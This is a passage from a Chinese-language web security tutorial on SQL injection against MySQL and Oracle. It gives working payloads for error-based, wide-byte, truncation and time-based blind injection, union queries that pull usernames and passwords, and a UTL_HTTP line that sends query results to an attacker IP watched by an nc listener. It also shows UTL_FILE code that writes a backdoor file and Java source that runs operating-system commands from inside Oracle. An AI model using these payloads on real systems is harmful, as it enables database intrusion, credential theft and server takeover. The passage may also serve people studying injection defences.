align="center">查询权限</td></tr><tr><td align="center">update</td><td align="center">表</td><td align="center">更新权限</td></tr><tr><td align="center">create view</td><td align="center">视图</td><td align="center">创建视图权限</td></tr><tr><td align="center">show view</td><td align="center">视图</td><td align="center">查看视图权限</td></tr><tr><td align="center">alter routine</td><td align="center">存储过程</td><td align="center">更改存储过程权限</td></tr><tr><td align="center">create routine</td><td align="center">存储过程</td><td align="center">创建存储过程权限</td></tr><tr><td align="center">execute</td><td align="center">存储过程</td><td align="center">执行存储过程权限</td></tr><tr><td align="center">file</td><td align="center">服务器主机上的文件访问</td><td align="center">文件访问权限</td></tr><tr><td align="center">create temporary tables</td><td align="center">服务器管理</td><td align="center">创建临时表权限</td></tr><tr><td align="center">lock tables</td><td align="center">服务器管理</td><td align="center">锁表权限</td></tr><tr><td align="center">create user</td><td align="center">服务器管理</td><td align="center">创建用户权限</td></tr><tr><td align="center">process</td><td align="center">服务器管理</td><td align="center">查看进程权限</td></tr><tr><td align="center">reload</td><td align="center">服务器管理</td><td align="center">执行flush-hosts、flush-logs、flush-privileges等命令权限</td></tr><tr><td align="center">replication client</td><td align="center">服务器管理</td><td align="center">复制权限</td></tr><tr><td align="center">replication slave</td><td align="center">服务器管理</td><td align="center">复制权限</td></tr><tr><td align="center">show databases</td><td align="center">服务器管理</td><td align="center">查看数据库权限</td></tr><tr><td align="center">shutdown</td><td align="center">服务器管理</td><td align="center">关闭数据库权限</td></tr><tr><td align="center">super</td><td align="center">服务器管理</td><td align="center">执行kill线程权限</td></tr></tbody></table><h4 id="5-MYSQL显错式注入"><a href="#5-MYSQL显错式注入" class="headerlink" title="5.MYSQL显错式注入"></a>5.MYSQL显错式注入</h4><h5 id="通过updatexml-函数报错"><a href="#通过updatexml-函数报错" class="headerlink" title="通过updatexml()函数报错:"></a>通过updatexml()函数报错:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:updatexml()函数的第二个参数必须为xpath格式的字符串，由于0x7c是”|”,不是xpath格式，所以会报错说xpath语法错误 </p><h5 id="通过extractvalue-函数报错"><a href="#通过extractvalue-函数报错" class="headerlink" title="通过extractvalue()函数报错:"></a>通过extractvalue()函数报错:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：extractvalue()第二个参数必须为xpath格式的字符串，由于0x7c是”|”,不是xpath格式，所以会报错说xpath语法错误 </p><h5 id="通过floor-函数报错"><a href="#通过floor-函数报错" class="headerlink" title="通过floor()函数报错:"></a>通过floor()函数报错:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token punctuation">)</span>b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-宽字节注入"><a href="#6-宽字节注入" class="headerlink" title="6.宽字节注入"></a>6.宽字节注入</h4><h5 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h5><p>一般出现在php+mysql中,数据库编码方式为宽字节编码,<br>当php配置文件php.ini中magic_quotes_gpc(魔术引导)选项被打开时,<br>使用get,post,cookie所接收的’(单引号)、”(双引号)、\(反斜线)和null 字符都会被自动加上一个反斜线转义</p><h5 id="根本原因："><a href="#根本原因：" class="headerlink" title="根本原因："></a>根本原因：</h5><p>编码不统一</p><h5 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token string">'%d5'</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于魔术引导，所以该语句变为</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token string">'%d5\''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是%d5\被浏览器url编码后为%d5%5c,由于数据库编码方式为宽字节编码，<br>它会把%d5%5c解码为一个汉字，因此就绕过了\对我们输入的单引号转义的限<br>制，因此可以构造sql语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token string">'%d5'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">-- '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-mysql长字符截断"><a href="#7-mysql长字符截断" class="headerlink" title="7.mysql长字符截断"></a>7.mysql长字符截断</h4><h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件:"></a>前提条件:</h5><p>mysql中的一个设置里有一个sql_mode选项，当sql_mode设置为default时，<br>即没有开启strict_all_tables选项时（mysql sql_mode默认为default)，<br>MYSQL对插入超长的值只会提示warning,而不是error,这样就会导致一些截断问题</p><h5 id="例：-1"><a href="#例：-1" class="headerlink" title="例："></a>例：</h5><p>假设当前数据库有user表，表中有name这个列，<br>表中有一条admin的记录(用户名为“admin”,长度为5,是管理员密码），<br>name列的定义为varchar(7)，向user表中插入数据：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">user</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'admin '</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：admin后为很多空格，admin和空格的总长度远远大于name列的规定长度7<br>这样，我们就向user表中添加了一个用户,查看该用户名长度，发现长度为7,<br>说明我们插入的用户名被截断了，只保留了name列规定的前7位<br>通过 </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> name<span class="token operator">=</span><span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们发现不仅查出了“admin”这个用户名，还查出来了”admin “这个用户名。</p><h5 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h5><p>假设没有sql注入漏洞可以利用，目标用户名为”admin”,<br>我们就可以利用mysql长字符截断的特性来注册一个”admin “之类的用户名（好像给admin用户增加了一个密码似的），<br>我们就可以用我们注册的帐号密码去登录，就可以进入admin用户的后台管理页面。</p><h4 id="8-延时注入-盲注）"><a href="#8-延时注入-盲注）" class="headerlink" title="8.延时注入(盲注）"></a>8.延时注入(盲注）</h4><h5 id="判断是否存在sql注入及注入点"><a href="#判断是否存在sql注入及注入点" class="headerlink" title="判断是否存在sql注入及注入点:"></a>判断是否存在sql注入及注入点:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：如果3秒后返回页面，说明存在sql注入，即可判断出注入点 </p><h5 id="通过延时注入读取数据"><a href="#通过延时注入读取数据" class="headerlink" title="通过延时注入读取数据:"></a>通过延时注入读取数据:</h5><p>(1)首先判断当前查询的字符串的长度:  </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(2)字符串长度判断出之后，截取查询字符串的第一个字符，并转换为ascii码，将该ascii码与ascii码表对比: </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>递归破解出字符串所有的字符<br>注：不仅在MYSQL中存在延时函数，在SQL server、Oracle等数据库中也都存在类似功能的函数，比如SQL server中的waitfor delay、Oracle中的dbms_lock.sleep等函数</p><h3 id="Oracle-（Oracle不支持多语句执行"><a href="#Oracle-（Oracle不支持多语句执行" class="headerlink" title="Oracle （Oracle不支持多语句执行)"></a>Oracle （Oracle不支持多语句执行)</h3><h4 id="1-获取元数据"><a href="#1-获取元数据" class="headerlink" title="1.获取元数据"></a>1.获取元数据</h4><h5 id="（1）user-tablespaces视图：查看表空间："><a href="#（1）user-tablespaces视图：查看表空间：" class="headerlink" title="（1）user_tablespaces视图：查看表空间："></a>（1）user_tablespaces视图：查看表空间：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> tablespace_name <span class="token keyword">from</span> user_tablespaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-user-tables视图：查看当前用户的所有表"><a href="#2-user-tables视图：查看当前用户的所有表" class="headerlink" title="(2)user_tables视图：查看当前用户的所有表:"></a>(2)user_tables视图：查看当前用户的所有表:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> user_tables <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-user-tab-columns视图-查看当前用户表的所有列"><a href="#3-user-tab-columns视图-查看当前用户表的所有列" class="headerlink" title="(3)user_tab_columns视图:查看当前用户表的所有列:"></a>(3)user_tab_columns视图:查看当前用户表的所有列:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name <span class="token keyword">from</span> user_tab_columns <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-all-users视图：查看Oracle数据库的所有用户"><a href="#4-all-users视图：查看Oracle数据库的所有用户" class="headerlink" title="(4)all_users视图：查看Oracle数据库的所有用户:"></a>(4)all_users视图：查看Oracle数据库的所有用户:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> all_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="5-user-objects视图：查看当前用户的所有对象-表名、约束、索引）"><a href="#5-user-objects视图：查看当前用户的所有对象-表名、约束、索引）" class="headerlink" title="(5)user_objects视图：查看当前用户的所有对象(表名、约束、索引）:"></a>(5)user_objects视图：查看当前用户的所有对象(表名、约束、索引）:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> object_name <span class="token keyword">from</span> user_objects<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-union查询"><a href="#2-union查询" class="headerlink" title="2.union查询"></a>2.union查询</h4><h5 id="第一步：获取列数："><a href="#第一步：获取列数：" class="headerlink" title="第一步：获取列数："></a>第一步：获取列数：</h5><ul><li><p>使用 order by 获取列数:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用union获取列数:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：Oracle规定，每次查询时后面必须跟表名称，否则sql语句错误；<br>dual是Oracle的虚拟表，在不知道数据库中存在哪些表的情况下可以使用此表作为查询表；<br>Oracle是强类型的数据库，一般使用null</p></li></ul><h5 id="第二步：获取敏感信息："><a href="#第二步：获取敏感信息：" class="headerlink" title="第二步：获取敏感信息："></a>第二步：获取敏感信息：</h5><p>常见敏感信息:</p><ul><li><p>当前用户权限：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> session_roles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>当前数据库版本:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> banner <span class="token keyword">from</span> sys<span class="token punctuation">.</span>v_$version <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>服务器出口IP：<br>用utl_http.request可以实现</p></li><li><p>服务器监听IP：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_address <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>服务器操作系统:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> member <span class="token keyword">from</span> v$logfile <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>服务器sid:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> instance_name <span class="token keyword">from</span> v$instance<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>当前连接用户:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> SYS_CONTEXT<span class="token punctuation">(</span><span class="token string">'USERENV'</span><span class="token punctuation">,</span><span class="token string">'CURRENT_USER'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>获取数据库表及其内容：</p><ul><li>在得知表的列数之后，可以通过查询元数据的方式查询表名、列名，然后查询数据:<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>注：在查询数据时要注意数据类型，要一一测试，否则无法查询：<br><code>union select username,null,null from users</code><br><code>union select null,username,null from users</code><br><code>union select null,null,username from users</code><br>注：在得知列数之后，也可以通过暴力猜解的方式来枚举表名：<br><code>http://xss.com/a.php?id=1 union select null,null,null from tableName</code><br>同样也可以使用暴力猜解的方法枚举列名：<br><code>http://xss.com/a.php?id=1 union select columnName,null,null from tableName</code><br><code>http://xss.com/a.php?id=1 union select null,columnName,null from tableName</code><br><code>http://xss.com/a.php?id=1 union select null,null,columnName from tableName</code></li></ul><h4 id="3-Oracle中包的概念"><a href="#3-Oracle中包的概念" class="headerlink" title="3.Oracle中包的概念"></a>3.Oracle中包的概念</h4><h5 id="UTL-HTTP包：提供了对HTTP的一些操作"><a href="#UTL-HTTP包：提供了对HTTP的一些操作" class="headerlink" title="UTL_HTTP包：提供了对HTTP的一些操作"></a>UTL_HTTP包：提供了对HTTP的一些操作</h5><ul><li><p>例： </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>很多时候页面不能直接回显，可以利用此包将数据反弹到一个外网IP查看:</p><ul><li>第一步：使用nc监听数据:  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">nc <span class="token operator">-</span>l <span class="token operator">-</span>vv <span class="token operator">-</span>p <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>第二步：反弹数据信息:  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> UTL_HTTP<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'[http://IP:8888/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SQL</span>语句<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>http:<span class="token comment">//IP:8888/%27%7C%7C%28SQL%E8%AF%AD%E5%8F%A5%29 "http://IP:8888/'%7C%7C(SQL%E8%AF%AD%E5%8F%A5)"))=1--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  注：前提是该服务器必须可以联网，且UTL_HTTP必须存在。</li></ul></li><li><p>判断UTL_HTTP是否存在：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> all_objects <span class="token keyword">where</span> object_name<span class="token operator">=</span><span class="token string">'UTL_HTTP'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h5 id="UTL-FILE包-用来操作IO"><a href="#UTL-FILE包-用来操作IO" class="headerlink" title="UTL_FILE包:用来操作IO"></a>UTL_FILE包:用来操作IO</h5><ul><li><p>向磁盘写入文件：</p><ul><li>第一步：准备文件写入目录:  <pre class="line-numbers language-java" data-language="java"><code class="language-java">create or replace directory <span class="token constant">XXSER_DIR</span> as <span class="token char">'C:'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>第二步：写入文件:  <pre class="line-numbers language-java" data-language="java"><code class="language-java">declarexs_file utl_file<span class="token punctuation">.</span>file_type<span class="token punctuation">;</span> #定义变量的类型为utl_file<span class="token punctuation">.</span>file_typebeginxs_file <span class="token operator">:</span><span class="token operator">=</span> utl_file<span class="token punctuation">.</span><span class="token function">fopen</span><span class="token punctuation">(</span>'<span class="token constant">XXSER_DIR</span><span class="token char">', '</span>bug<span class="token punctuation">.</span>jsp<span class="token char">', '</span><span class="token class-name">W</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span> #写入米名称utl_file<span class="token punctuation">.</span><span class="token function">put_line</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">,</span><span class="token char">'木马后门'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> #写入字符串，每次写一行utl_file<span class="token punctuation">.</span><span class="token function">put_line</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">,</span><span class="token char">'木马后门2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> #写入字符串，如果只写一行，此行可以删除了utl_file<span class="token punctuation">.</span><span class="token function">fflush</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">)</span><span class="token punctuation">;</span> #刷缓冲utl_file<span class="token punctuation">.</span><span class="token function">fclose</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">)</span><span class="token punctuation">;</span> #关闭文件指针end<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>读取磁盘文件:</p><ul><li>第一步：准备所读文件目录:  <pre class="line-numbers language-java" data-language="java"><code class="language-java">create or replace directory <span class="token constant">XXSER_DIR</span> as <span class="token char">'D:'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>第二步：读文件:  <pre class="line-numbers language-java" data-language="java"><code class="language-java">declarexs_file utl_file<span class="token punctuation">.</span>file_type<span class="token punctuation">;</span> #定义变量fp_buffer <span class="token function">varchar2</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> #读取文件大小beginxs_file <span class="token operator">:</span><span class="token operator">=</span> utl_file<span class="token punctuation">.</span><span class="token function">fopen</span><span class="token punctuation">(</span>'<span class="token constant">XXSER_DIR</span><span class="token char">','</span>xxser<span class="token punctuation">.</span>jsp<span class="token char">','</span><span class="token class-name">R</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span> #指定文件utl_file<span class="token punctuation">.</span><span class="token function">get_line</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">,</span>fp_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> #读取一行放到fp_buffer变量中dbms_output<span class="token punctuation">.</span><span class="token function">put_line</span><span class="token punctuation">(</span>fp_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> #在终端输出结果utl_file<span class="token punctuation">.</span><span class="token function">fclose</span><span class="token punctuation">(</span>xs_file<span class="token punctuation">)</span><span class="token punctuation">;</span> #关闭文件指针end<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h5 id="Oracle执行系统命令"><a href="#Oracle执行系统命令" class="headerlink" title="Oracle执行系统命令:"></a>Oracle执行系统命令:</h5><ul><li><p>第一步：创建java执行代码包:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">create or replace and compile java source named <span class="token string">"OSCommand"</span> as<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OSCommand</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Process</span> pro <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">windowsOrLinux</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            pro<span class="token operator">=</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /c "</span><span class="token operator">+</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            pro<span class="token operator">=</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"exec "</span><span class="token operator">+</span>command<span class="token operator">+</span><span class="token string">" error!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token string">"exec ok ..."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">windowsOrLinux</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> os <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第二步：赋予用户java执行权限:    </p><pre class="line-numbers language-java" data-language="java"><code class="language-java">declare<span class="token class-name">SCHEMA</span> <span class="token function">varchar2</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">:</span><span class="token operator">=</span> <span class="token char">'XXSER'</span><span class="token punctuation">;</span> #用户名必须大写begindbms_java<span class="token punctuation">.</span><span class="token function">grant_permission</span><span class="token punctuation">(</span>    <span class="token constant">SCHEMA</span><span class="token punctuation">,</span>    '<span class="token constant">SYS</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FilePermission</span>'<span class="token punctuation">,</span>    '<span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&lt;</span>ALL FILES<span class="token punctuation">></span><span class="token punctuation">></span></span>'<span class="token punctuation">,</span>    'execute'<span class="token punctuation">)</span><span class="token punctuation">;</span>dbms_java<span class="token punctuation">.</span><span class="token function">grant_permission</span><span class="token punctuation">(</span>    <span class="token constant">SCHEMA</span><span class="token 